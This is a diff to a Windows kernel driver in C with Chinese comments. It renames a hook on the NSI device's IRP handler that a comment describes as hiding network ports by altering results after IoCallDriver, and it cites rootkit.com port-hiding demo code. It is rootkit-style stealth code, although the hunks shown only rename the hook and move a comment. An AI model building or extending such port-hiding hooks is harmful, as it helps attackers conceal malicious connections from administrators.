@@ -359,12 +359,7 @@ void EnumTcpTable(_In_ PNsiParameters NsiParam)
 }
 
 
-NTSTATUS MyNsippEnumerateObjectsAllParameters(_In_ struct _DEVICE_OBJECT * DeviceObject, _Inout_ PIRP Irp)
-//NTSTATUS MyNsippEnumerateObjectsAllParameters(PVOID InputBuffer,
-//                                              SIZE_T Length,
-//                                              KPROCESSOR_MODE RequestorMode,
-//                                              PULONG_PTR Information
-//)
+NTSTATUS EnumerateObjectsAllParameters(_In_ struct _DEVICE_OBJECT * DeviceObject, _Inout_ PIRP Irp)
 /*
 功能：隐藏端口。
 
@@ -375,6 +370,16 @@ NTSTATUS MyNsippEnumerateObjectsAllParameters(_In_ struct _DEVICE_OBJECT * Devic
 篡改时机：IoCallDriver之后。
 
 InputBufferLength：不小于0x3C，也不小于0x70。经观察都是0x70。
+
+操作系统的函数原型：
+//NTSTATUS NsippEnumerateObjectsAllParameters(PVOID InputBuffer,
+//                                            SIZE_T Length,
+//                                            KPROCESSOR_MODE RequestorMode,
+//                                            PULONG_PTR Information)
+
+操作系统的用法：
+NsippEnumerateObjectsAllParameters(Type3InputBuffer, 
+                                   (SIZE_T)InputBufferLength, RequestorMode, &Irp->IoStatus.Information);
 
 参考：https://github.com/claudiouzelac/rootkit.com/blob/c8869de5a947273c9c151b44aa39643a7fea531c/cardmagic/PortHidDemo_Vista.c
 */
@@ -442,11 +447,7 @@ NTSTATUS NsiDeviceControl(_In_ struct _DEVICE_OBJECT * DeviceObject, _Inout_ PIR
 
     switch (IoControlCode) {
     case 0x12001Bu://NsippEnumerateObjectsAllParameters
-        //MyNsippEnumerateObjectsAllParameters(Type3InputBuffer,
-        //                                     (SIZE_T)InputBufferLength,
-        //                                     RequestorMode,
-        //                                     &Irp->IoStatus.Information);
-        Status = MyNsippEnumerateObjectsAllParameters(DeviceObject, Irp);
+        Status = EnumerateObjectsAllParameters(DeviceObject, Irp);
         break;
     case 0x120007u://NsippGetParameter
         Status = DefaultMajorFunction(DeviceObject, Irp);
